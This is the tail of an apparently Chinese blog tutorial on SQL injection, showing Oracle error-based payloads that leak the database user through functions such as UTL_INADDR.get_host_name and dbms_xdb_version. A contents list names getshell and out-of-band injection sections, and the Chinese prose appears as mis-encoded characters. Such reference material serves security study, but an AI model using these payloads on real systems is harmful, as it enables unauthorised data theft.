<li><strong>dbms_xdb_version.makeversioned</strong></li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select dbms_xdb_version.makeversioned((select user from dual)) from dual;<br></code></pre></td></tr></table></figure>

<ul>
<li><strong>dbms_xdb_version.uncheckout</strong></li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select dbms_xdb_version.uncheckout((select user from dual)) from dual;<br></code></pre></td></tr></table></figure>

<ul>
<li><strong>dbms_utility.sqlid_to_sqlhash</strong></li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual;<br></code></pre></td></tr></table></figure>

<ul>
<li><strong>ordsys.ord_dicom.getmappingxpath</strong></li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual;<br></code></pre></td></tr></table></figure>

<ul>
<li><strong>UTL_INADDR.get_host_name</strong></li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select UTL_INADDR.get_host_name((select user from dual)) from dual;<br></code></pre></td></tr></table></figure>

<ul>
<li><strong>UTL_INADDR.get_host_address</strong></li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select UTL_INADDR.get_host_name(&#x27;~&#x27;||(select user from dual)||&#x27;~&#x27;) from dual;<br></code></pre></td></tr></table></figure>

<h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1><p>è¿™ç¯‡æ–‡ç« åªæ˜¯ç²—ç•¥çš„ä»‹ç»ï¼Œç›²æ³¨çš„å†…å®¹æˆ‘å…¨éƒ¨çœç•¥äº†ï¼Œæ­¤æ–‡ç« ä½œä¸ºè‡ªå·±çš„å‚è€ƒï¼Œå¸Œæœ›å¯ä»¥å¸®åŠ©åˆ°ä¸ºæ•°ä¸å¤šçš„è¯»è€…</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/07/11/PortSwigger%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/">â† Next PortSwiggeræ‰“é¶éšè®°</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/04/Xss%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">Xssæ³¨å…¥æ€»ç»“ Prev â†’</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="å›åˆ°é¡¶éƒ¨" style="opacity: 0; display: none;">âˆ§</a><a id="to-index" href="#toc-div" title="æ–‡ç« ç›®å½•">â‰¡</a><a id="color-mode" onClick="colorMode.change()" title="åˆ‡æ¢ä¸»é¢˜"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>ä¸ä¸æ— è°“äººäº‰æ°”</p></div></div><div id="aside-block"><div id="toc-div"><h1>ç›®å½•</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%8E%86%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">æ³¨å…¥å†ç¨‹</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%8D%E7%9B%98%E5%8F%8D%E6%80%9D"><span class="toc-number">3.</span> <span class="toc-text">å¤ç›˜åæ€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqlite"><span class="toc-number">4.</span> <span class="toc-text">Sqlite</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.</span> <span class="toc-text">åˆ¤æ–­æ–¹æ³•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">åŸºæœ¬æ³¨å…¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell"><span class="toc-number">4.3.</span> <span class="toc-text">GetShell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sql-Server"><span class="toc-number">5.</span> <span class="toc-text">Sql Server</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95-1"><span class="toc-number">5.1.</span> <span class="toc-text">åˆ¤æ–­æ–¹æ³•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5-1"><span class="toc-number">5.2.</span> <span class="toc-text">åŸºæœ¬æ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">5.2.1.</span> <span class="toc-text">è”åˆæŸ¥è¯¢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">5.2.2.</span> <span class="toc-text">æŠ¥é”™æ³¨å…¥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell-1"><span class="toc-number">5.3.</span> <span class="toc-text">GetShell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E4%B8%8Bgetshell"><span class="toc-number">5.3.1.</span> <span class="toc-text">å †å æ³¨å…¥ä¸‹getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E9%80%9A%E8%BF%87%E7%89%B9%E6%AE%8A%E5%87%BD%E6%95%B0-getshell"><span class="toc-number">5.3.1.1.</span> <span class="toc-text">ç›´æ¥é€šè¿‡ç‰¹æ®Šå‡½æ•° getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%B4%E6%8E%A5%E9%80%9A%E8%BF%87vbs-getshell"><span class="toc-number">5.3.1.2.</span> <span class="toc-text">é—´æ¥é€šè¿‡vbs getshell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%87%E4%BB%BDgetshell"><span class="toc-number">5.3.2.</span> <span class="toc-text">å¤‡ä»½getshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Orancle"><span class="toc-number">6.</span> <span class="toc-text">Orancle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95-2"><span class="toc-number">6.1.</span> <span class="toc-text">åˆ¤æ–­æ–¹æ³•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5-2"><span class="toc-number">6.2.</span> <span class="toc-text">åŸºæœ¬æ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2-1"><span class="toc-number">6.2.1.</span> <span class="toc-text">è”åˆæŸ¥è¯¢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-1"><span class="toc-number">6.2.2.</span> <span class="toc-text">æŠ¥é”™æ³¨å…¥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle%E5%B8%A6%E5%A4%96%E9%80%9A%E4%BF%A1%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF-dnslog%E6%B3%A8%E5%85%A5"><span class="toc-number">6.2.3.</span> <span class="toc-text">Oracleå¸¦å¤–é€šä¿¡è·å–ä¿¡æ¯ dnslogæ³¨å…¥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell-2"><span class="toc-number">6.3.</span> <span class="toc-text">GetShell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PostgreSQL"><span class="toc-number">7.</span> <span class="toc-text">PostgreSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95-3"><span class="toc-number">7.1.</span> <span class="toc-text">åˆ¤æ–­æ–¹æ³•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5-3"><span class="toc-number">7.2.</span> <span class="toc-text">åŸºæœ¬æ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2-2"><span class="toc-number">7.2.1.</span> <span class="toc-text">è”åˆæŸ¥è¯¢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-2"><span class="toc-number">7.2.2.</span> <span class="toc-text">æŠ¥é”™æ³¨å…¥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell-3"><span class="toc-number">7.3.</span> <span class="toc-text">GetShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-3"><span class="toc-number">7.4.</span> <span class="toc-text">æŠ¥é”™æ³¨å…¥</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E5%90%8E"><span class="toc-number">8.</span> <span class="toc-text">æœ€å</span></a></li></ol></div></div><footer><nobr>æ„å»ºè‡ª <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> ä½¿ç”¨ä¸»é¢˜ <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>ä¸»é¢˜ä½œè€… <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
 el: '#valine'
 , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
 , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: 'æ­¤æ¡è¯„è®ºå§”æ‰˜ä¼é¹…ç‰©æµå‘é€'
 , path: window.location.pathname
});code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>